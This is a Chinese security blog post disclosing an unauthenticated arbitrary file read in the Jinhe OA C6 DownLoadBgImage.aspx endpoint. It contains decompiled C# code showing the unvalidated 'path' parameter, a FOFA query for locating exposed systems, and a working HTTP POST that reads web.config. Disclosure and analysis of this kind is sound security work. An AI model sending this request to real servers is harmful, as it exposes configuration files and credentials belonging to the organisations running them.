---
title: "金和OA DownLoadBgImage.aspx 文件读取漏洞"
source: https://mrxn.net/jswz/jhsoft-LoginTemplate-DownLoadBgImage-fileread.html
asset_dir: assets/金和oa-downloadbgimage.aspx-文件读取漏洞
---

# 金和OA DownLoadBgImage.aspx 文件读取漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/10/18 13:36
- 588浏览
- [0评论](#comment)
- 17分钟阅读

深入探索

VPN服务

物流软件安全

JSON处理工具

---

# 漏洞简介

金和OA 是一款广泛应用于企业内部管理的办公自动化系统，旨在提供流程审批、文档管理、协同办公等功能，助力企业提升运营效率。然而，在金和OA系统的 DownLoadBgImage.aspx 接口处存在一处[文件读取漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)。攻击者可以通过精心构造的请求参数，绕过权限验证，直接读取服务器上的敏感文件内容。该漏洞可能导致系统配置文件、用户数据或其他关键信息的泄露，进而为攻击者提供进一步入侵系统的可能性，严重威胁企业信息安全。

漏洞修复方案

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

根据 `OuterAppTIDSave.aspx` 的源码，在 `bin` 目录下查找 `JHBase.Web.AddMenu.dll` 将其进行反编译后找到 **DownLoadBgImage** 的处理逻辑

```
protected void Page_Load(object sender, EventArgs e)
{
  string filePath = this.Request["path"];
  string pathType = this.Request["pathType"];
  if (!string.IsNullOrEmpty(filePath))
  {
    try
    {
      this.DownLoad(filePath, pathType);
    }
```

深入探索

网络安全会议

安全工具开发

企业安全咨询

如果参数 `path` 不为空或null，则进入`DownLoad`方法

```
protected void DownLoad(string filePath, string pathType)
{
  if (string.op_Inequality(pathType, "1"))
    filePath = this.Server.MapPath(filePath);
  string str = "image" + filePath.Substring(filePath.LastIndexOf("."));
  if (File.Exists(filePath))
  {
    FileStream fileStream = File.OpenRead(filePath);
    byte[] numArray = new byte[(int) ((Stream) fileStream).Length];
    ((Stream) fileStream).Read(numArray, 0, numArray.Length);
    ((Stream) fileStream).Close();
    this.Response.Clear();
    this.Response.ClearHeaders();
    this.Response.Buffer = true;
    this.Response.AppendHeader("Content-Disposition", "attachment;  filename=" + HttpUtility.UrlEncode(Encoding.UTF8.GetBytes(str)));
    this.Response.BinaryWrite(numArray);
  }
```

如果**参数pathType不等于1**则直接拼接**filePath**到当前请求物理路径上，然后进行文件读取、输出操作，整个过程没有任何校验或过滤，因此造成[文件读取漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)。

# 漏洞复现

```
POST /c6/Jhsoft.Web.AddMenu/LoginTemplate/DownLoadBgImage.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net
Content-Type: application/x-www-form-urlencoded

path=/c6/web.config
```

[![金和OA DownLoadBgImage.aspx 文件读取漏洞](images/img-001-c471f4f51081.webp)](https://image.mrxn.net/082f83908fc140fc9335cd3e7f4cea48.webp)

成功读取到 web.config 文件内容

文件大小转换

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读

网络安全
